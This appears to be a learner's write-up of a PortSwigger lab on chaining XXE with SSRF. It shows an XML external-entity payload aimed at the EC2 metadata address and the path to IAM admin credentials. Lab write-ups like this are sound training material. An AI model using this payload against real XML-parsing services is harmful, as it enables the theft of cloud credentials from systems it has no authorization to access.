# Portswigger XXE-Lab 2

## Exploiting XXE to perform SSRF attacks

In this lab we are told to perfrom XXE and chaing it with SSRF to access ec2 instance's meta-data to retrieve iam admin credentials , the `checkstock` is vulnerable to XXE as it's parsing data in XML format

<img src="https://i.imgur.com/bq4tglm.png"/>

<img src="https://i.imgur.com/ULFHsIF.png"/>

So here let's use burpsuite to capture the request

<img src="https://i.imgur.com/iYWTtja.png"/>

To perform XXE attack , we need to declare an external entity

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY arz SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>			   	
     <productId>
		14
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```

<img src="https://i.imgur.com/naEFY0j.png"/>

This is expecting `latest` so let's add that 

<img src="https://i.imgur.com/R05obzK.png"/>

Now it expects `meta-data` so in this way we can find the endpoints 

<img src="https://i.imgur.com/te36Pld.png"/>

And enventually we'll find `iam` credentials

`http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`
